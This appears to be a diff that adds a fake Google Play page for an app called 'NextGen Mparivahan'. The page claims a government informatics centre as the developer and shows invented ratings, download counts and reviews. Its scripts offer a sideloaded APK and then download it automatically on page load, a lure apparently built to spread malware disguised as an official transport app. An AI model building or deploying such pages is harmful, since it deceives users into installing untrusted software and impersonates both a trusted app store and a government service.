@@ -1,0 +1,502 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#ffffff">
+<title>NextGen Mparivahan - Download</title>
+
+<style>
+:root {
+  --green: #01875f;
+  --text: #202124;
+  --muted: #5f6368;
+  --line: #dadce0;
+}
+
+* { box-sizing: border-box; }
+
+body {
+  margin: 0;
+  font-family: Arial, sans-serif;
+  color: var(--text);
+  background: #fff;
+}
+
+header {
+  height: 64px;
+  display: flex;
+  align-items: center;
+  padding: 0 18px;
+  border-bottom: 1px solid #eee;
+  gap: 12px;
+}
+
+.logo {
+  font-size: 22px;
+  color: #01875f;
+  font-weight: bold;
+}
+
+.brand { font-size: 20px; }
+
+.profile {
+  margin-left: auto;
+  width: 36px;
+  height: 36px;
+  border-radius: 50%;
+  background: #d2e3fc;
+  color: #1967d2;
+  border: 0;
+  font-size: 18px;
+}
+
+main {
+  max-width: 960px;
+  margin: auto;
+  padding: 28px 20px 60px;
+}
+
+.app-head {
+  display: flex;
+  align-items: center;
+  gap: 18px;
+}
+
+.app-icon {
+  width: 88px;
+  height: 88px;
+  border-radius: 20px;
+  object-fit: cover;
+  background: #eee;
+}
+
+h1 {
+  font-size: 24px;
+  font-weight: 500;
+  margin: 0 0 8px;
+}
+
+.developer {
+  color: var(--green);
+  font-size: 14px;
+  margin-bottom: 7px;
+}
+
+.muted {
+  color: var(--muted);
+  font-size: 13px;
+}
+
+.stats {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  margin: 30px 0;
+  max-width: 590px;
+}
+
+.stat {
+  text-align: center;
+  border-right: 1px solid var(--line);
+}
+
+.stat:last-child { border: 0; }
+
+.stat strong {
+  display: block;
+  font-size: 18px;
+  margin-bottom: 7px;
+}
+
+.stat span {
+  font-size: 12px;
+  color: var(--muted);
+}
+
+.install {
+  display: block;
+  max-width: 590px;
+  background: var(--green);
+  color: white;
+  padding: 15px;
+  text-align: center;
+  text-decoration: none;
+  border-radius: 8px;
+  font-weight: bold;
+}
+
+.actions {
+  display: flex;
+  gap: 30px;
+  color: var(--green);
+  font-size: 14px;
+  margin: 20px 0 35px;
+}
+
+h2 {
+  font-size: 18px;
+  font-weight: 500;
+  margin: 30px 0 15px;
+}
+
+.screenshots {
+  display: flex;
+  gap: 12px;
+  overflow-x: auto;
+  padding-bottom: 12px;
+}
+
+.screenshots img {
+  height: 230px;
+  width: auto;
+  border-radius: 12px;
+  border: 1px solid #eee;
+}
+
+.description {
+  font-size: 14px;
+  line-height: 1.7;
+  color: #3c4043;
+  white-space: pre-line;
+}
+
+.details {
+  border-top: 1px solid var(--line);
+}
+
+.detail {
+  display: flex;
+  justify-content: space-between;
+  padding: 15px 0;
+  border-bottom: 1px solid #eee;
+  font-size: 14px;
+  gap: 15px;
+}
+
+.detail span { color: var(--muted); }
+
+.review {
+  padding: 16px 0;
+  border-bottom: 1px solid #eee;
+}
+
+.review-name {
+  font-weight: bold;
+  font-size: 14px;
+}
+
+.stars {
+  margin: 8px 0;
+  color: #f9ab00;
+}
+
+.review-text {
+  font-size: 14px;
+  line-height: 1.5;
+}
+
+.notice {
+  margin-top: 25px;
+  padding: 14px;
+  background: #f8f9fa;
+  border-radius: 10px;
+  font-size: 12px;
+  color: var(--muted);
+  line-height: 1.5;
+}
+
+footer {
+  padding: 25px;
+  text-align: center;
+  color: #888;
+  font-size: 12px;
+}
+
+@media(max-width: 420px) {
+  main { padding: 24px 17px 50px; }
+  .app-icon { width: 76px; height: 76px; }
+  h1 { font-size: 21px; }
+  .screenshots img { height: 210px; }
+}
+</style>
+</head>
+
+<body>
+
+<header>
+  <div class="logo">▶</div>
+  <div class="brand">Google Play</div>
+  <button class="profile" aria-label="Profile">●</button>
+</header>
+
+<main>
+
+<section class="app-head">
+  <img class="app-icon" id="appIcon"
+       src="assets/app-icon.PNG" alt="App icon">
+
+  <div>
+    <h1 id="appName"></h1>
+    <div class="developer" id="developer"></div>
+    <div class="muted" id="subline"></div>
+  </div>
+</section>
+
+<section class="stats">
+  <div class="stat">
+    <strong id="rating"></strong>
+    <span id="reviewCount"></span>
+  </div>
+
+  <div class="stat">
+    <strong id="downloads"></strong>
+    <span>Downloads</span>
+  </div>
+
+  <div class="stat">
+    <strong id="age"></strong>
+    <span>Rated for</span>
+  </div>
+</section>
+
+<a class="install"
+   id="downloadButton"
+   href="NextGenMparivahan.apk"
+   download="NextGenMparivahan.apk">
+   Download APK
+</a>
+
+<div class="actions">
+  <span>♧ Share</span>
+  <span>♡ Add to wishlist</span>
+</div>
+
+<h2>Screenshots</h2>
+<div class="screenshots" id="screenshots"></div>
+
+<h2>About this app</h2>
+<p class="description" id="description"></p>
+
+<h2>Ratings and reviews</h2>
+<div id="reviews"></div>
+
+<h2>App info</h2>
+
+<div class="details">
+
+  <div class="detail">
+    <span>Version</span>
+    <strong id="version"></strong>
+  </div>
+
+  <div class="detail">
+    <span>Updated</span>
+    <strong id="updated"></strong>
+  </div>
+
+  <div class="detail">
+    <span>Requires Android</span>
+    <strong id="android"></strong>
+  </div>
+
+  <div class="detail">
+    <span>Download size</span>
+    <strong id="size"></strong>
+  </div>
+
+</div>
+
+<div class="notice">
+  ALL IN ONE SOLUTION FOR TRANSPORT NEEDS.
+</div>
+
+</main>
+
+<footer>
+  © <span id="year"></span>
+  <span id="footerDeveloper"></span>
+</footer>
+
+<script>
+
+/* ==================================
+   CHANGE YOUR APP DETAILS HERE
+================================== */
+
+const APP = {
+
+  appName: "NextGen Mparivahan",
+  developer: "National Infomatics Centre",
+
+  subline: "Contains ads · In-app purchases",
+
+  rating: "4.8 ★",
+  reviewCount: "12.5K reviews",
+  downloads: "1M+",
+  age: "3+",
+
+  // APK filename
+  apk: "NextGenMparivahan.apk",
+
+  // App icon
+  icon: "assets/app-icon.PNG",
+
+  // Screenshots
+  screenshots: [
+    "assets/screenshot-1.JPG",
+    "assets/screenshot-2.JPG",
+    "assets/screenshot-3.JPG"
+  ],
+
+  description: `Complete Transport Solution For citizens.
+
+Features   The main benefits of this app are -
+
+1. Find details of any parked, accidental or theft vehicle by just entering the registration number.
+2. Verify your car registration details.
+3. Verify details of a second-hand vehicle.
+4. If you want to buy a second-hand car you can verify the age and registration details.
+
+Along with the above features, you can also verify DL details and create virtual DL and RC
+in this app.
+
+Highlights: Virtual RC/DL, Encrypted QR Code, Information Services, DL/RC search, Transport Notification to the citizen, RTO/Traffic Office Locations. Complete Transport Office related services will also be facilitated soon...`,
+
+  version: "1.0.0",
+  updated: "November 2026",
+  android: "Android 6.0 and up",
+  size: "25 MB",
+
+  reviews: [
+    {
+      name: "Subhash Nayar",
+      rating: 5,
+      text: "I got all the details i needed good app ."
+    },
+    {
+      name: "Ramesh Desai",
+      rating: 4,
+      text: "Paid my dues online without going anywhere."
+    }
+  ]
+
+};
+
+
+/* ==================================
+   PAGE DISPLAY
+================================== */
+
+// Correct page title
+document.title = APP.appName + " - Download";
+
+// App details
+document.getElementById("appName").textContent = APP.appName;
+document.getElementById("developer").textContent = APP.developer;
+document.getElementById("footerDeveloper").textContent = APP.developer;
+document.getElementById("subline").textContent = APP.subline;
+
+document.getElementById("rating").textContent = APP.rating;
+document.getElementById("reviewCount").textContent = APP.reviewCount;
+document.getElementById("downloads").textContent = APP.downloads;
+document.getElementById("age").textContent = APP.age;
+
+// App icon
+document.getElementById("appIcon").src = APP.icon;
+
+// Correct APK download link and filename
+const downloadButton = document.getElementById("downloadButton");
+
+downloadButton.href = APP.apk;
+downloadButton.setAttribute("download", APP.apk);
+
+// Description
+document.getElementById("description").textContent = APP.description;
+
+// App information
+document.getElementById("version").textContent = APP.version;
+document.getElementById("updated").textContent = APP.updated;
+document.getElementById("android").textContent = APP.android;
+document.getElementById("size").textContent = APP.size;
+
+// Footer year
+document.getElementById("year").textContent =
+  new Date().getFullYear();
+
+
+/* ==================================
+   SCREENSHOTS
+================================== */
+
+const screenshotArea =
+  document.getElementById("screenshots");
+
+APP.screenshots.forEach((file, index) => {
+
+  const img = document.createElement("img");
+
+  img.src = file;
+  img.alt = APP.appName + " screenshot " + (index + 1);
+
+  screenshotArea.appendChild(img);
+
+});
+
+
+/* ==================================
+   REVIEWS
+================================== */
+
+const reviewArea = document.getElementById("reviews");
+
+APP.reviews.forEach(review => {
+
+  const card = document.createElement("div");
+  card.className = "review";
+
+  const name = document.createElement("div");
+  name.className = "review-name";
+  name.textContent = review.name;
+
+  const stars = document.createElement("div");
+  stars.className = "stars";
+  stars.textContent =
+    "★".repeat(Math.max(0, Math.min(5, review.rating)));
+
+  const text = document.createElement("div");
+  text.className = "review-text";
+  text.textContent = review.text;
+
+  card.append(name, stars, text);
+  reviewArea.appendChild(card);
+
+});
+
+</script>
+<script>
+window.addEventListener("load", function () {
+
+  if (!sessionStorage.getItem("apkAutoDownloaded")) {
+
+    setTimeout(function () {
+
+      const link = document.createElement("a");
+
+      link.href = "NextGenMparivahan.apk";
+      link.download = "NextGenMparivahan.apk";
+
+      document.body.appendChild(link);
+      link.click();
+      link.remove();
+
+      sessionStorage.setItem("apkAutoDownloaded", "true");
+
+    }, 1500);
+
+  }
+
+});
+</script>
+</body>
+</html>
